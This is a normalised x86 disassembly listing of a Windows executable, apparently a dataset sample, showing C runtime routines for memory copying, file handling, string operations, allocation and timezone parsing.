movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec ecx
jne r-xdata
mov esi [ ebp - 0x8 ]
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_420571
push ebp
mov ebp esp
sub esp 0x1c
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] ebx
mov ebx [ ebp + 0xc ]
mov eax ebx
cdq
mov ecx eax
mov eax [ ebp + 0x8 ]
xor ecx edx
sub ecx edx
and ecx 0xf
xor ecx edx
sub ecx edx
cdq
mov edi eax
xor edi edx
sub edi edx
and edi 0xf
xor edi edx
sub edi edx
mov edx ecx
or edx edi
jne r-xdata
cmp ecx edi
jne r-xdata
mov esi [ ebp + 0x10 ]
mov ecx esi
and ecx 0x7f
mov [ ebp - 0x18 ] ecx
cmp esi ecx
je r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
neg ecx
add ecx 0x10
mov [ ebp - 0x1c ] ecx
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp - 0x1c ]
[ edi ] [ esi ]
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x1c ]
mov edx [ ebp + 0xc ]
add edx [ ebp - 0x1c ]
mov eax [ ebp + 0x10 ]
sub eax [ ebp - 0x1c ]
push eax
push edx
push ecx
call sub_420571
add esp 0xc
mov eax [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
je r-xdata
sub esi ecx
push esi
push ebx
push eax
call sub_4204ea
add esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x18 ]
mov ebx [ ebp - 0x4 ]
mov esi [ ebp - 0x8 ]
mov edi [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
mov ebx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
add edx ebx
sub edx ecx
mov [ ebp - 0x14 ] edx
add ebx eax
sub ebx ecx
mov [ ebp - 0x10 ] ebx
mov esi [ ebp - 0x14 ]
mov edi [ ebp - 0x10 ]
mov ecx [ ebp - 0x18 ]
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
sub_420654
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
xor ebx ebx
push 0x1
push ebx
push ebx
push [ ebp + 0x8 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
call sub_42034c
mov [ ebp - 0x18 ] eax
and eax edx
add esp 0x10
mov [ ebp - 0x14 ] edx
cmp eax 0xffffffff
je r-xdata
call sub_4119bb
mov eax [ eax ]
push 0x2
push ebx
push ebx
push [ ebp + 0x8 ]
call sub_42034c
mov ecx eax
and ecx edx
add esp 0x10
cmp ecx 0xffffffff
je r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x10 ]
sub esi eax
sbb edi edx
js r-xdata
cmp edi ebx
jg r-xdata
jg r-xdata
push ebx
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
push [ ebp + 0x8 ]
call sub_42034c
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
jl r-xdata
mov ebx 0x1000
push ebx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
cmp esi ebx
jbe r-xdata
xor eax eax
jmp r-xdata
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42034c
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
cmp esi ebx
jae r-xdata
push 0x8000
push [ ebp + 0x8 ]
call sub_42080a
pop ecx
pop ecx
mov [ ebp - 0x8 ] eax
call sub_4119bb
mov [ eax ] 0xc
pop edi
pop esi
pop ebx
leave
retn
push [ ebp + 0x8 ]
call sub_41b5ae
pop ecx
push eax
call [ SetEndOfFile@IAT ]
neg eax
sbb eax eax
neg eax
dec eax
cdq
mov [ ebp - 0x10 ] eax
and eax edx
mov [ ebp - 0xc ] edx
cmp eax 0xffffffff
jne r-xdata
mov eax esi
jg r-xdata
call sub_4119bb
mov [ eax ] 0xd
call sub_4119ce
mov esi eax
call [ GetLastError@IAT ]
mov [ esi ] eax
mov esi [ ebp - 0x10 ]
call sub_4119ce
cmp [ eax ] 0x5
jne r-xdata
cdq
sub esi eax
sbb edi edx
js r-xdata
mov eax ebx
jmp r-xdata
cmp esi ebx
jb r-xdata
or esi 0xffffffff
mov [ ebp - 0xc ] esi
jmp r-xdata
call sub_4119bb
mov [ eax ] 0xd
mov esi [ ebp - 0x10 ]
jg r-xdata
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_41e08d
add esp 0xc
cmp eax 0xffffffff
je r-xdata
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call sub_42080a
pop ecx
pop ecx
push [ ebp - 0x4 ]
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
xor ebx ebx
jmp r-xdata
and esi [ ebp - 0xc ]
cmp esi 0xffffffff
je r-xdata
test edi edi
jl r-xdata
test esi esi
ja r-xdata
sub_42080a
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov eax esi
sar eax 0x5
lea edx [ eax * 4 + rw-data ]
mov eax [ edx ]
and esi 0x1f
shl esi 0x6
lea ecx [ eax + esi ]
mov al [ ecx + 0x24 ]
add al al
push edi
movzx edi [ ecx + 0x4 ]
movsx eax al
and edi 0x80
sar eax 0x1
cmp ebx 0x4000
je r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
and [ ecx ] 0x80
cmp ebx 0x8000
je r-xdata
neg eax
sbb eax eax
and eax 0xc000
add eax 0x4000
pop ebp
retn
mov eax 0x8000
pop ebp
retn
and [ ecx + 0x4 ] 0x7f
jmp r-xdata
cmp ebx 0x10000
je r-xdata
test edi edi
pop edi
pop esi
pop ebx
jne r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
mov dl [ ecx ]
and dl 0x82
or dl 0x2
jmp r-xdata
cmp ebx 0x20000
je r-xdata
mov [ ecx ] dl
jmp r-xdata
cmp ebx 0x40000
jne r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
mov dl [ ecx ]
and dl 0x81
or dl 0x1
sub_4208c6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
call sub_4119bb
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_41897d
add esp 0x14
push 0x16
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_420967
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
push esi
imul ecx ecx 0xc
add ecx [ ebp + 0x8 ]
pop esi
cmp eax ecx
jae r-xdata
mov esi ecx
imul esi esi 0xc
add esi [ ebp + 0x8 ]
add eax 0xc
cmp eax esi
jb r-xdata
xor eax eax
cmp [ eax + 0x4 ] edx
je r-xdata
cmp [ eax + 0x4 ] edx
je r-xdata
pop ebp
retn
sub_4209ab
push 0x20
push r--data
call sub_4183f0
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov ebx [ ebp + 0x8 ]
cmp ebx 0xb
jg r-xdata
mov eax ebx
sub eax 0xf
je r-xdata
je r-xdata
mov esi rw-data
mov eax [ rw-data ]
sub eax 0x6
je r-xdata
call sub_418001
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax ebx
push 0x2
pop ecx
sub eax ecx
je r-xdata
call sub_418435
retn
cmp [ ebp - 0x20 ] eax
jne r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
mov edx ebx
call sub_420967
mov esi eax
add esi 0x8
mov eax [ esi ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
sub eax ecx
je r-xdata
cmp [ ebp - 0x1c ] eax
je r-xdata
push 0x3
call sub_4171a5
mov [ ebp - 0x1c ] 0x1
push eax
call sub_417df1
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
call sub_4119bb
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_41897d
add esp 0x14
jmp r-xdata
mov [ ebp - 0x20 ] eax
pop ecx
xor eax eax
cmp [ ebp - 0x20 ] 0x1
je r-xdata
sub eax ecx
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x8
je r-xdata
push eax
call sub_419f99
pop ecx
sub eax ecx
jne r-xdata
mov ecx [ edi + 0x60 ]
mov [ ebp - 0x2c ] ecx
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
call sub_417de8
mov [ esi ] eax
mov ecx [ edi + 0x64 ]
mov [ ebp - 0x30 ] ecx
mov [ edi + 0x64 ] 0x8c
cmp ebx 0x4
jne r-xdata
push ebx
call [ ebp - 0x20 ]
push [ edi + 0x64 ]
push ebx
call [ ebp - 0x20 ]
pop ecx
jmp r-xdata
mov ecx [ rw-data ]
mov [ ebp - 0x24 ] ecx
cmp ebx 0x8
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
pop ecx
cmp ebx 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_420b1f
cmp ebx 0x8
jne r-xdata
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0xc
mov edx [ edi + 0x5c ]
mov [ ecx + edx + 0x8 ] eax
inc [ ebp - 0x24 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x30 ]
mov [ edi + 0x64 ] eax
cmp ebx 0x4
jne r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
add ecx edx
cmp [ ebp - 0x24 ] ecx
jge r-xdata
sub_420b79
push 0x10
push r--data
call sub_4183f0
and [ ebp - 0x4 ] 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ InitializeCriticalSectionAndSpinCount@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_418435
retn
sub_420bd9
mov edi edi
push ebp
mov ebp esp
inc [ rw-data ]
push 0x1000
call sub_418672
pop ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
test eax eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
pop ebp
retn
sub_420c22
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
call sub_417de8
and [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x0
mov ebx eax
jne r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
push r--data
call [ LoadLibraryA@IAT ]
mov edi eax
test edi edi
je r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
xor eax eax
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
test eax eax
je r-xdata
push [ rw-data ]
call sub_417df1
pop ecx
test eax eax
je r-xdata
push eax
call sub_417df1
pop ecx
test eax eax
je r-xdata
push eax
call sub_417df1
push [ rw-data ]
mov esi eax
call sub_417df1
pop ecx
pop ecx
mov edi eax
test esi esi
je r-xdata
push eax
call sub_417d76
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_417d76
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_417d76
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_417d76
pop ecx
mov [ rw-data ] eax
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
call eax
jmp r-xdata
call eax
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
test edi edi
je r-xdata
push r--data
push edi
call esi
push eax
call sub_417d76
pop ecx
mov [ rw-data ] eax
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
call esi
test eax eax
je r-xdata
push eax
call sub_417df1
pop ecx
test eax eax
je r-xdata
or [ ebp + 0x10 ] 0x200000
jmp r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push 0xc
lea ecx [ ebp - 0x14 ]
push ecx
push 0x1
push eax
call edi
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call eax
mov [ ebp - 0x4 ] eax
test [ ebp - 0xc ] 0x1
jne r-xdata
sub_420d8b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp eax ebx
je r-xdata
call sub_4119bb
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov edx eax
mov [ eax ] bl
jmp r-xdata
cmp edi ebx
je r-xdata
inc edx
dec edi
jne r-xdata
mov cl [ esi ]
mov [ edx ] cl
inc edx
inc esi
cmp cl bl
je r-xdata
cmp [ edx ] bl
je r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ eax ] bl
call sub_4119bb
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_41897d
add esp 0x14
mov eax esi
jmp r-xdata
sub_420dff
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
push edi
cmp [ ebp + 0x14 ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
jne r-xdata
call sub_4119bb
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebp + 0x14 ] ebx
jne r-xdata
xor eax eax
mov edx [ ebp + 0x10 ]
cmp edx ebx
jne r-xdata
mov [ esi ] bl
jmp r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
mov eax esi
jne r-xdata
mov [ esi ] bl
jmp r-xdata
mov cl [ edx ]
mov [ eax ] cl
inc eax
inc edx
cmp cl bl
je r-xdata
mov cl [ edx ]
mov [ eax ] cl
inc eax
inc edx
cmp cl bl
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
dec edi
je r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
mov [ eax ] bl
dec [ ebp + 0x14 ]
jne r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
jmp r-xdata
mov [ esi ] bl
call sub_4119bb
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov eax [ ebp + 0xc ]
push 0x50
mov [ esi + eax - 0x1 ] bl
pop eax
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_41897d
add esp 0x14
mov eax esi
jmp r-xdata
sub_420eb4
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push esi
xor esi esi
cmp ecx esi
jl r-xdata
call sub_4119bb
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_41897d
add esp 0x14
or eax 0xffffffff
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
jmp r-xdata
cmp ecx 0x3
jne r-xdata
pop esi
pop ebp
retn
mov eax [ rw-data ]
jmp r-xdata
sub_420eff
push 0xc
push r--data
call sub_4183f0
mov ecx [ ebp + 0x8 ]
xor edi edi
cmp ecx edi
jbe r-xdata
imul ecx [ ebp + 0xc ]
mov esi ecx
mov [ ebp + 0x8 ] esi
cmp esi edi
jne r-xdata
push 0xffffffe0
pop eax
xor edx edx
div ecx
cmp eax [ ebp + 0xc ]
sbb eax eax
inc eax
jne r-xdata
xor ebx ebx
mov [ ebp - 0x1c ] ebx
cmp esi 0xffffffe0
ja r-xdata
xor esi esi
inc esi
call sub_4119bb
mov [ eax ] 0xc
push edi
push edi
push edi
push edi
push edi
call sub_41897d
add esp 0x14
cmp ebx edi
jne r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
call sub_418435
retn
mov eax ebx
cmp [ rw-data ] edi
je r-xdata
cmp ebx edi
jne r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
mov eax [ ebp + 0x8 ]
cmp eax [ rw-data ]
ja r-xdata
cmp ebx edi
jne r-xdata
push esi
call sub_41b47f
pop ecx
test eax eax
jne r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov ebx eax
push 0x4
call sub_419f99
pop ecx
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
call sub_41a7ab
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_420ffb
mov ebx [ ebp - 0x1c ]
cmp ebx edi
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax edi
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax edi
je r-xdata
push [ ebp + 0x8 ]
push edi
push ebx
call sub_412f80
add esp 0xc
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
mov [ eax ] 0xc
jmp r-xdata
sub_42101d
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push ebx
xor ebx ebx
cmp ecx ebx
jbe r-xdata
imul ecx [ ebp + 0x10 ]
push esi
push edi
mov esi ecx
cmp [ ebp + 0x8 ] ebx
je r-xdata
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax [ ebp + 0x10 ]
jae r-xdata
push esi
push [ ebp + 0x8 ]
call sub_416ca5
mov edi eax
pop ecx
pop ecx
test edi edi
je r-xdata
push [ ebp + 0x8 ]
call sub_4187a3
pop ecx
mov ebx eax
call sub_4119bb
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0xc
call sub_41897d
add esp 0x14
xor eax eax
jmp r-xdata
mov eax edi
pop edi
pop esi
cmp ebx esi
jae r-xdata
pop ebx
pop ebp
retn
sub esi ebx
push esi
push 0x0
add ebx edi
push ebx
call sub_412f80
add esp 0xc
sub_4210a0
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
push edi
mov edi [ ebp + 0xc ]
cmp esi ebx
je r-xdata
call sub_418ddf
mov esi eax
push esi
call sub_424864
pop ecx
test eax eax
jne r-xdata
mov [ ebp - 0x10 ] ebx
mov eax [ ebp + 0x10 ]
cmp eax ebx
jg r-xdata
cmp edi ebx
je r-xdata
call sub_4119ce
mov [ eax ] 0xf
call sub_4119bb
mov [ eax ] 0xd
push 0x2e
pop eax
mov [ ebp - 0xc ] ax
xor eax eax
mov [ ebp - 0xa ] ax
push 0x3a
pop eax
mov [ ebp - 0xa ] ax
push 0x2e
pop eax
add esi 0x40
mov [ ebp - 0x8 ] ax
xor eax eax
mov [ ebp - 0xc ] si
mov [ ebp - 0x6 ] ax
jmp r-xdata
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ edi ] ax
jmp r-xdata
call sub_4119bb
mov [ eax ] 0x16
jmp r-xdata
xor eax eax
call [ GetLastError@IAT ]
push eax
call sub_4119e1
pop ecx
cmp edi ebx
je r-xdata
mov esi [ GetFullPathNameW@IAT ]
lea eax [ ebp - 0x14 ]
push eax
push edi
push [ ebp - 0x10 ]
lea eax [ ebp - 0xc ]
push eax
call esi
cmp eax ebx
je r-xdata
cmp esi ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_41897d
add esp 0x14
jmp r-xdata
cmp eax [ ebp + 0x10 ]
jle r-xdata
cmp eax [ ebp - 0x10 ]
jge r-xdata
push 0x2
push [ ebp + 0x10 ]
call sub_41d208
mov edi eax
pop ecx
pop ecx
cmp edi ebx
jne r-xdata
mov [ ebp + 0x10 ] eax
call sub_4119bb
mov [ eax ] 0x22
xor eax eax
mov [ edi ] ax
jmp r-xdata
mov eax edi
jmp r-xdata
lea eax [ ebp - 0x14 ]
push eax
push edi
push [ ebp + 0x10 ]
lea eax [ ebp - 0xc ]
push eax
call esi
cmp eax ebx
je r-xdata
call sub_4119bb
mov [ eax ] 0xc
call sub_4119ce
mov [ eax ] 0x8
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_411f81
leave
retn
cmp eax [ ebp + 0x10 ]
jl r-xdata
sub_4211ec
push 0xc
push r--data
call sub_4183f0
push 0x7
call sub_419f99
pop ecx
and [ ebp - 0x4 ] 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push 0x0
call sub_4210a0
add esp 0xc
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42122c
mov eax [ ebp - 0x1c ]
call sub_418435
retn
sub_421235
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_415547
mov ebx [ ebp + 0x8 ]
xor esi esi
cmp ebx esi
jne r-xdata
push edi
mov edi [ ebp + 0xc ]
cmp edi esi
jne r-xdata
call sub_4119bb
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_41897d
add esp 0x14
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] esi
jne r-xdata
call sub_4119bb
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_41897d
add esp 0x14
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
movzx eax [ ebx ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_418ea8
movzx esi ax
movzx eax [ edi ]
lea ecx [ ebp - 0x10 ]
push ecx
inc ebx
push eax
inc ebx
call sub_418ea8
add esp 0x10
inc edi
inc edi
movzx eax ax
test si si
je r-xdata
movzx eax [ ebx ]
cmp ax 0x41
jb r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop esi
pop ebx
leave
retn
movzx ecx ax
movzx eax si
sub eax ecx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp si ax
je r-xdata
movzx esi ax
movzx eax [ edi ]
cmp ax 0x41
jb r-xdata
cmp ax 0x5a
ja r-xdata
pop edi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
inc ebx
inc ebx
inc edi
inc edi
movzx eax ax
test si si
je r-xdata
cmp ax 0x5a
ja r-xdata
add eax 0x20
cmp si ax
je r-xdata
add eax 0x20
jmp r-xdata
sub_421346
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
push edi
cmp [ rw-data ] esi
jne r-xdata
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_421235
add esp 0xc
mov edi [ ebp + 0x8 ]
cmp edi esi
jne r-xdata
mov edx [ ebp + 0xc ]
cmp edx esi
je r-xdata
call sub_4119bb
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_41897d
add esp 0x14
mov eax 0x7fffffff
jmp r-xdata
movzx eax [ edi ]
cmp ax 0x41
jb r-xdata
pop edi
pop esi
pop ebp
retn
movzx ecx ax
movzx eax [ edx ]
cmp ax 0x41
jb r-xdata
cmp ax 0x5a
ja r-xdata
inc edi
inc edi
inc edx
inc edx
movzx eax ax
cmp cx si
je r-xdata
cmp ax 0x5a
ja r-xdata
add eax 0x20
movzx edx ax
movzx eax cx
sub eax edx
jmp r-xdata
cmp cx ax
je r-xdata
add eax 0x20
sub_42140c
push 0x2c
push r--data
call sub_4183f0
xor ebx ebx
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x20 ] ebx
push 0x7
call sub_419f99
pop ecx
mov [ ebp - 0x4 ] ebx
call sub_421c6e
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x1c ]
push eax
call sub_421c23
pop ecx
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x24 ]
push eax
call sub_421bb1
pop ecx
cmp eax ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_418855
add esp 0x14
lea eax [ ebp - 0x28 ]
push eax
call sub_421bea
pop ecx
cmp eax ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_418855
add esp 0x14
call sub_4247b2
mov [ ebp - 0x34 ] eax
mov [ rw-data ] ebx
or edi 0xffffffff
mov [ rw-data ] edi
mov [ rw-data ] edi
push r--data
call sub_41339f
pop ecx
mov esi eax
mov [ ebp - 0x3c ] esi
cmp esi ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_418855
add esp 0x14
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
cmp [ esi ] bl
je r-xdata
push rw-data
call [ GetTimeZoneInformation@IAT ]
cmp eax edi
je r-xdata
push eax
call sub_4121b5
pop ecx
mov [ rw-data ] ebx
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
mov [ ebp - 0x2c ] 0x1
xor ecx ecx
inc ecx
mov [ rw-data ] ecx
mov eax [ rw-data ]
imul eax eax 0x3c
mov [ ebp - 0x1c ] eax
cmp [ rw-data ] bx
je r-xdata
push esi
call sub_412e40
inc eax
push eax
call sub_418672
pop ecx
pop ecx
mov [ rw-data ] eax
cmp eax ebx
je r-xdata
push eax
push esi
call sub_415980
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_418435
retn
push 0x3
push esi
push 0x40
mov edi [ ebp - 0x20 ]
push [ edi ]
call sub_420dff
add esp 0x10
test eax eax
je r-xdata
cmp [ rw-data ] bx
je r-xdata
mov edx [ rw-data ]
imul edx edx 0x3c
add eax edx
mov [ ebp - 0x1c ] eax
push esi
push esi
call sub_412e40
pop ecx
inc eax
push eax
push [ rw-data ]
call sub_41cf11
add esp 0xc
cmp eax ebx
je r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
add esi 0x3
cmp [ esi ] 0x2d
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_418855
add esp 0x14
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] ebx
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
push [ ebp - 0x1c ]
call sub_4213fb
push [ ebp - 0x24 ]
call sub_4213d9
push [ ebp - 0x28 ]
call sub_4213ea
add esp 0xc
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4216b8
cmp [ ebp - 0x2c ] ebx
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_418855
add esp 0x14
jmp r-xdata
push eax
call sub_4121b5
pop ecx
push esi
call sub_42489d
pop ecx
imul eax eax 0xe10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x38 ] 0x1
inc esi
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
mov [ eax ] bl
cmp [ ebp - 0x30 ] ebx
jne r-xdata
mov [ ebp - 0x24 ] ecx
sub eax [ rw-data ]
imul eax eax 0x3c
mov [ ebp - 0x28 ] eax
jmp r-xdata
inc esi
jmp r-xdata
cmp al 0x30
jl r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x4 ]
mov [ eax ] bl
cmp [ ebp - 0x30 ] ebx
jne r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
mov [ eax + 0x3f ] bl
jmp r-xdata
lea eax [ ebp - 0x30 ]
push eax
push ebx
push 0x3f
mov eax [ ebp - 0x20 ]
push [ eax ]
push edi
push rw-data
push ebx
push [ ebp - 0x34 ]
mov edi [ WideCharToMultiByte@IAT ]
call edi
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x2b
je r-xdata
cmp [ esi ] 0x3a
jne r-xdata
cmp al 0x39
jg r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x4 ]
mov [ eax + 0x3f ] bl
jmp r-xdata
lea eax [ ebp - 0x30 ]
push eax
push ebx
push 0x3f
mov eax [ ebp - 0x20 ]
push [ eax + 0x4 ]
push 0xffffffff
push rw-data
push ebx
push [ ebp - 0x34 ]
call edi
test eax eax
je r-xdata
